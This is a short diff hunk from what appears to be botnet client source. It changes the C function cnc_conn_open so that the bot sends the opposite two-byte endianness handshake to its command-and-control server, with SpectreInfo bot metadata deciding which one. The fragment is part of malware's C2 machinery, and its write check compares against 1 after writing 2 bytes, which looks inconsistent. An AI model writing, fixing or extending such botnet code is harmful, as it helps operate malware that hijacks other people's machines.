@@ -121,7 +121,7 @@ bool cnc_conn_open() {
     }
 
     SpectreInfo *info = get_bot_info();
-    if ((info->LittleEndian ? WRITE_SOCKET(sock, "\00\x01", 2) : WRITE_SOCKET(sock, "\00\x02", 2)) != 1) {
+    if ((info->LittleEndian ? WRITE_SOCKET(sock, "\00\x02", 2) : WRITE_SOCKET(sock, "\00\x01", 2)) != 1) {
         debug_error("Failed to write");
         return false;
     }
